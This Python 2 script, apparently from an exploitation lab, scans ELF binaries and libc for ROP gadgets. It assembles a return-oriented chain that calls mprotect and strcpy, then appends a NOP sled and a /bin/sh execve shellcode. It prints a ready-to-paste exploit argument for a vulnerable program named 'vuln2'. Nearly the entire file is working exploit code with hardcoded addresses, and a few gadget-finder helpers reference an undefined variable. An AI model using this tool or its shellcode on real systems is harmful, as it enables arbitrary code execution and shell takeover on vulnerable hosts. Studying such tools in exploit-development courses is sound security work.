from capstone import *
from elftools.common.py3compat import bytes2str
from elftools.elf.elffile import ELFFile
import argparse
import struct
import subprocess
import os
import io

register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
buf_address = 0xbfffeda8
buf_len = 256
packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


def find_gadgets(sectionData, startAddr, gadget_map, unique_gadget_map):
    retCount = sectionData.count("\xc3")
    if retCount == 0:
        return
    splitList = sectionData.split("\xc3")
    idx = 0

    while idx < len(splitList) - 1: 
        splitList[idx] += "\xc3"
        idx += 1

    valOffset = 0
    for val in splitList:
        i = 0
        val_length = len(val)
        if val_length > 10:
            i = val_length - 10
        while i < val_length:
            gadget_map[startAddr + valOffset + i] = val[i:val_length]
            i += 1
        valOffset += val_length

    for gadget_addr in gadget_map:
        if gadget_map[gadget_addr] not in unique_gadget_map.values():
            md = Cs(CS_ARCH_X86, CS_MODE_32)
            md.detail = False
            endWithRet = False
            discardGadget = False
            gadget = gadget_map[gadget_addr]
            instr_list = md.disasm(gadget, gadget_addr)
            n_bytes = len(gadget)
            byte_count = 0
            i = 0
            if instr_list is None:
                continue
            for instr in instr_list:
                i += 1
                byte_count += instr.size
                if (instr.mnemonic == "ret") and (instr.op_str == "") and (byte_count == n_bytes):
                    endWithRet = True
                if (instr.mnemonic == "leave") or (instr.mnemonic[0] == 'j'):
                    discardGadget = True
                    break
                if (instr.mnemonic == "call") and (instr.op_str != "dword ptr gs:[0x10]"):
                    discardGadget = True
                    break
                if (instr.mnemonic == "ret") and (instr.op_str != ""):
                    discardGadget = True
                    break
            if (discardGadget is False) and (n_bytes == byte_count) and (n_bytes > 1) and (endWithRet is True):
                unique_gadget_map[gadget_addr] = gadget_map[gadget_addr]


def build_disassembled_gadgets_map(gadgetMap):
    disassembled_map = {}
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    md.detail = False 

    for gadget_addr in gadgetMap:
        gadget = gadgetMap[gadget_addr]
        instr_list = md.disasm(gadget, gadget_addr)
        disassembled_map[gadget_addr] = instr_list
    return disassembled_map

def print_gadgets(gadgetMap):
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    md.detail = False 

    for gadget_addr in gadgetMap:
        gadget = gadgetMap[gadget_addr]
        instr_list = md.disasm(gadget, gadget_addr)
        out_str = format(gadget_addr, '#010x') + " : "
        for instr in instr_list:
            out_str += instr.mnemonic
            if instr.op_str != "":
                out_str += " " + instr.op_str
            out_str += " ; "
        print out_str

def find_pop2_ret(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
        if mnemonic_list == ["pop", "pop", "ret"]:
            return gadget_addr
    return 0

def find_pop3_ret(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
        if mnemonic_list == ["pop", "pop", "pop", "ret"]:
            return gadget_addr
    return 0

def find_inc_eax(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_list.append(instr.op_str)
        if mnemonic_list == ["inc", "ret"] and op_list.count("eax") == 1:
            return gadget_addr
    return 0

def find_dec_eax(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_list.append(instr.op_str)
        if mnemonic_list == ["dec", "ret"] and op_list.count("eax") == 1:
            return gadget_addr
    return 0

def find_xor_eax_eax(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["xor", "ret"] and op_string.count("eax") == 2:
            return gadget_addr
    return 0

def find_xchg_eax_ebx(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["xchg", "ret"] and op_string.count("eax") == 1 and op_string.count("ebx") == 1:
            return gadget_addr
    return 0

def find_xchg_eax_edx(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["xchg", "ret"] and op_string.count("eax") == 1 and op_string.count("edx") == 1:
            return gadget_addr
    return 0

def find_and_eax_x1000(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["and", "movzx", "ret"] and op_string.count("eax") == 1 and op_string.count("0x1000") == 1:
            return gadget_addr
    return 0

def find_and_eax_xfffff000(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["and", "or", "pop", "ret"] and op_string.count("eax") == 2 and op_string.count("0xfffff000") == 1:
            return gadget_addr
    return 0

def find_add_eax_x20(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["add", "pop", "pop", "ret"] and op_string.count("eax") == 1 and op_string.count("0x20") == 1:
            return gadget_addr
    return 0

def find_push_esp_pop_ebx(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["push", "pop", "pop", "ret"] and op_string.count("esp") == 1 and op_string.count("ebx") == 1:
            return gadget_addr
    return 0

def find_mov_edx_eax(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["mov", "pop", "mov", "pop", "pop", "ret"] and op_string.count("eax") == 2 and op_string.count("edx") == 2:
            return gadget_addr
    return 0

def find_mov_ecx_eax(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_string = ""
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_string += instr.op_str
        if mnemonic_list == ["mov", "mov", "pop", "pop", "pop", "pop", "ret"] and op_string.count("eax") == 2 and op_string.count("ecx") == 2:
            return gadget_addr
    return 0

def find_syscall(gadgetMap):
    for gadget_addr in gadgetMap:
        instr_list = gadgetMap[gadget_addr]
        mnemonic_list = []
        op_list = []
        for instr in instr_list:
            mnemonic_list.append(instr.mnemonic)
            op_list.append(instr.op_str)
        if mnemonic_list == ["int", "ret"] and op_list.count("0x80") == 1:
            return gadget_addr
        if mnemonic_list == ["call", "ret"] and op_list.count("dword ptr gs:[0x10]") == 1:
            return gadget_addr
    return 0

def get_function_address(elffile, symname):
    dynsymtab = elffile.get_section_by_name(b'.dynsym')
    dynSymTable = elffile._make_section(dynsymtab.header)

    for sym in dynSymTable.iter_symbols():
        if sym.name == symname:
            return sym.entry['st_value']

    return 0

def find_null_byte(elffile):
    rodata_section = elffile.get_section_by_name(b'.rodata')

    startAddr = rodata_section.header['sh_addr']
    val = rodata_section.data()
       
    found = False
    for i in range(len(val)):
        startAddr = startAddr + 1
        if val[i] == '\x00':
            found = True
            break

    if found is True:
        return startAddr

    return 0

def pack_value(value):
    packed_value = struct.pack("<I", value)
    return packed_value

def build_rop_chain_libc(lib_list):
    libc_base_address = 0xb7e05000
    f = open("/lib/i386-linux-gnu/libc.so.6", 'rb')
    if f == None:
        print 'libc library not found !'
        exit(2)
    elffile = ELFFile(f)

    mprotect_offset = get_function_address(elffile, "mprotect")
    mprotect_addr = pack_value(libc_base_address + mprotect_offset)

    strcpy_offset = get_function_address(elffile, "__strcpy_g")
    strcpy_addr = pack_value(libc_base_address + strcpy_offset)

    null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))

    pop2_ret_offset = None
    for entry in lib_list:
        pop2_ret_offset = find_pop2_ret(entry[0])
        if pop2_ret_offset != None:
            pop2_addr = pack_value(entry[1] + pop2_ret_offset)
            break    

    if pop2_ret_offset == None:
        print 'Unable to find pop2_ret gadget !'
        exit(1)
    
    pop3_ret_offset = None
    for entry in lib_list:
        pop3_ret_offset = find_pop3_ret(entry[0])
        if pop3_ret_offset != None:
            pop3_addr = pack_value(entry[1] + pop3_ret_offset)
            break

    if pop3_ret_offset == None:
        print 'Unable to find pop3_ret gadget'
        exit(2)

    memory_start_address = ((buf_address >> 12) << 12)
    memory_length = 0x1000
    permissions = 0x7

    null_count = 0
    mprotect_arguments = pack_value(memory_start_address) + pack_value(memory_length) + pack_value(permissions)

    rop_payload = ""
    rop_payload += mprotect_addr + pop3_addr + mprotect_arguments.replace("\x00", "\x7f") + pack_value(buf_address)

    strcpy_dest_list = []
    strcpy_dest = buf_address + buf_len + 4 + (7 * 16) + 8 + 0 - 0x00
    #0x10 for ubuntu, 0x00 for kali
    strcpy_dest_list.append(strcpy_dest)
    strcpy_dest_list.append(strcpy_dest + 4)
    strcpy_dest_list.append(strcpy_dest + 6)
    strcpy_dest_list.append(strcpy_dest + 7)
    strcpy_dest_list.append(strcpy_dest + 9)
    strcpy_dest_list.append(strcpy_dest + 0xa)
    strcpy_dest_list.append(strcpy_dest + 0xb)

    strcpy_chain = ""
    for strcpy_da in strcpy_dest_list:
        strcpy_chain += strcpy_addr + pop2_addr + pack_value(strcpy_da) + null_byte_location

    rop_payload = strcpy_chain + rop_payload

    ret_addr = strcpy_addr
    nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
    nop_sled = "\x90" * nop_len

    rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload

    print_rop_payload(rop_payload) 

def print_rop_payload(buf):
    rows, columns = os.popen('stty size', 'r').read().split()
    print "#"*int(columns)
    print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
    print "#"*int(columns)
    bufstr = buf.encode("hex")
    i = 0
    exploit_str = ""
    while i < len(bufstr) - 1:
        exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
        i += 2
    print "`python -c \'print \"" + exploit_str + "\"\'`"
    print ""
    print "#"*int(columns)

def get_binary_instr(filename):
    gadget_map = {}
    unique_gadget_map = {}

    with open(filename, 'rb') as f:
        # read fbinary file 
        elffile = ELFFile(f)

        if filename.count(".so") == 1:
            textSec = elffile.get_section_by_name(b'.text')
            textStartAddr = textSec.header['sh_addr']
            textSection = textSec.data()
            find_gadgets(textSection, textStartAddr, gadget_map, unique_gadget_map)
        else:
            initSec = elffile.get_section_by_name(b'.init')
            initStartAddr = initSec.header['sh_addr']
            initSection = initSec.data()
            find_gadgets(initSection, initStartAddr, gadget_map, unique_gadget_map)

            pltSec = elffile.get_section_by_name(b'.plt')
            pltStartAddr = pltSec.header['sh_addr']
            pltSection = pltSec.data()
            find_gadgets(pltSection, pltStartAddr, gadget_map, unique_gadget_map)

            textSec = elffile.get_section_by_name(b'.text')
            textStartAddr = textSec.header['sh_addr']
            textSection = textSec.data()
            find_gadgets(textSection, textStartAddr, gadget_map, unique_gadget_map)

            finiSec = elffile.get_section_by_name(b'.fini')
            finiStartAddr = finiSec.header['sh_addr']
            finiSection = finiSec.data()
            find_gadgets(finiSection, finiStartAddr, gadget_map, unique_gadget_map)

        disassembled_map = build_disassembled_gadgets_map(unique_gadget_map)
        print_gadgets(unique_gadget_map)
        print str(len(unique_gadget_map)) + " unique gadgets found." 
        return disassembled_map
    return None 

def find_library_base_addr(vuln_binary, library_path):
    with io.FileIO("test.gdb", "w") as file:
        file.write("b main\nrun hello\ninfo proc mappings\n")

    cmd = "gdb --batch --command=./test.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello|grep " + os.path.realpath(library_path) + "|head -1|awk '{print $1}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    try:
        library_base_addr = int(proc.stdout.read(), 16)
    except Exception as e:
        print "Error finding library base address %s" %(str(e))
        return None

    os.remove("./test.gdb")
    return library_base_addr


#------------main program changes-----------------
if __name__ == '__main__':

    parser = argparse.ArgumentParser('ROP-Chain-Compiler')
    parser.add_argument("vuln_bin", type=str, help="Path to 32 bit x86 binary which is to be exploited")
    parser.add_argument("-lib", type=str, help="Path to libraries which are linked along with base addresses")
    args = parser.parse_args()
    
    lib_list = []
    if args.lib:
        #print 'Optional libraries provided are %s' %(args.lib)
        libraries = args.lib.split(' ')
        for entry in libraries:
            disas_map = get_binary_instr(entry)
            if disas_map == None:
                print '%s library not present !' %(entry)
                exit(1)

            base_addr = find_library_base_addr(args.vuln_bin, entry)
            if base_addr == None:
                print 'Unable to get base address for library %s' %(entry)
                exit(1)
            lib_list.append((disas_map, base_addr, entry))

    disas_map = get_binary_instr(args.vuln_bin)
    if disas_map == None:
        print '%s binary not present !' %(args.vuln_bin)
        exit(2)
    lib_list.append((disas_map, 0, args.vuln_bin))

    build_rop_chain_libc(lib_list)
